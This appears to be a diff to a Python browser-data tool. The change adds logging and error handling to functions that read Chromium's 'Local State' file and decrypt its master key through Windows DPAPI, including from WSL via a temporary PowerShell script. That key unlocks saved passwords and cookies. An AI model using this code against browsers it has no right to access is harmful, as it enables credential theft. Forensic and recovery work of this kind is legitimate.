@@ -497,6 +497,7 @@ def chromium_master_key(browser_base_path):
     """
     ls = browser_base_path / 'Local State'
     if not ls.exists():
+        print(f'[master_key] Local State not found: {ls}')
         return None
     try:
         data = json.loads(ls.read_text(encoding='utf-8'))
@@ -505,8 +506,15 @@ def chromium_master_key(browser_base_path):
         # First 5 bytes are the literal ASCII "DPAPI"
         if enc_key[:5] == b'DPAPI':
             enc_key = enc_key[5:]
-        return dpapi_decrypt(enc_key)
-    except Exception:
+        key = dpapi_decrypt(enc_key)
+        if key:
+            print(f'[master_key] Successfully extracted {len(key)}-byte key')
+            return key
+        else:
+            print('[master_key] DPAPI decryption returned None')
+            return None
+    except Exception as e:
+        print(f'[master_key] Extraction failed: {e}')
         return None
 
 
@@ -718,9 +726,15 @@ def _system_dpapi_decrypt(encrypted_bytes):
     import uuid
     task_id = uuid.uuid4().hex[:8]
     b64in = base64.b64encode(encrypted_bytes).decode()
-    win_temp = subprocess.run(
-        ['cmd.exe', '/c', 'echo', '%TEMP%'],
-        capture_output=True, text=True, timeout=5).stdout.strip()
+    
+    # Run cmd.exe from /tmp to avoid UNC path issues in WSL
+    try:
+        win_temp = subprocess.run(
+            ['cmd.exe', '/c', 'echo', '%TEMP%'],
+            capture_output=True, text=True, timeout=5, cwd='/tmp').stdout.strip()
+    except Exception as e:
+        print(f'[v20] Failed to get Windows TEMP directory: {e}')
+        return None
     script_win = f'{win_temp}\\hbd_{task_id}.ps1'
     out_win = f'{win_temp}\\hbd_{task_id}.txt'
     script_wsl = subprocess.run(
